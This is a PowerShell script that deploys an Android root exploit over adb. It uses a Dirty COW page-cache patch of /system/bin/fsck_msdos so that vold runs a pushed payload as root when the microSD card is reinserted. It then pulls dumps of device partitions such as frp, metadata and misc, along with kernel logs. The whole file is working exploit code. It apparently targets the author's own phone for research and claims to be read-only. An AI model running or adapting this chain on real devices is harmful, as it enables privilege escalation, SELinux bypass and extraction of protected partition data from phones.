# deploy.ps1 - session62 bcota/BCB read via Dirty COW -> vold -> fsck_msdos.
#
# Prereq: device connected over adb (oslo, serial 1160724779), microSD inserted.
# The payload runs as root in u:r:vold:s0 when vold mounts the vfat SD card,
# i.e. after a physical eject + reinsert of the microSD. Read-only against eMMC;
# a reboot restores the pristine /system/bin/fsck_msdos (page-cache patch only).

$ErrorActionPreference = "Continue"
$adb = "C:\Users\Stanley Williamson\AppData\Local\Android\Sdk\platform-tools\adb.exe"
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$bin  = Join-Path $here "bcota_read"
$pull = Join-Path $here "pulled"
New-Item -ItemType Directory -Force -Path $pull | Out-Null

Write-Host "== devices ==" -ForegroundColor Cyan
& $adb devices -l

Write-Host "== push payload ==" -ForegroundColor Cyan
& $adb push $bin /data/local/tmp/bcota_read
& $adb shell chmod 755 /data/local/tmp/bcota_read

Write-Host "== patch /system/bin/fsck_msdos page cache (RAM only) ==" -ForegroundColor Cyan
& $adb shell /data/local/tmp/ptracecow2 /system/bin/fsck_msdos /data/local/tmp/bcota_read

Write-Host ""
Write-Host ">>> NOW: physically EJECT and REINSERT the microSD card." -ForegroundColor Yellow
Write-Host ">>> (vold will exec fsck_msdos = our payload as root in u:r:vold:s0.)" -ForegroundColor Yellow
Read-Host "Press Enter once the card is back in and has settled (~5 s)" | Out-Null
Start-Sleep -Seconds 6

Write-Host "== pull results ==" -ForegroundColor Cyan
& $adb pull /storage/emulated/legacy/bc_read_log.txt  "$pull\bc_read_log.txt"
& $adb pull /storage/emulated/legacy/p2_bcota.bin     "$pull\p2_bcota.bin"
& $adb pull /storage/emulated/legacy/partitions_live.txt "$pull\partitions_live.txt"
& $adb pull /storage/emulated/legacy/cmdline_live.txt "$pull\cmdline_live.txt"
& $adb pull /storage/emulated/legacy/reset_live.txt   "$pull\reset_live.txt"
& $adb pull /storage/emulated/legacy/dmesg_live.txt   "$pull\dmesg_live.txt"
foreach ($n in @("metadata","frp","spare","ssd","pad","ares","gsign","fsc","fsg","misc")) {
    & $adb pull "/storage/emulated/legacy/p2_$n.bin" "$pull\p2_$n.bin" 2>$null
}

Write-Host "== log ==" -ForegroundColor Cyan
if (Test-Path "$pull\bc_read_log.txt") { Get-Content "$pull\bc_read_log.txt" }
Write-Host "Pulled into: $pull"
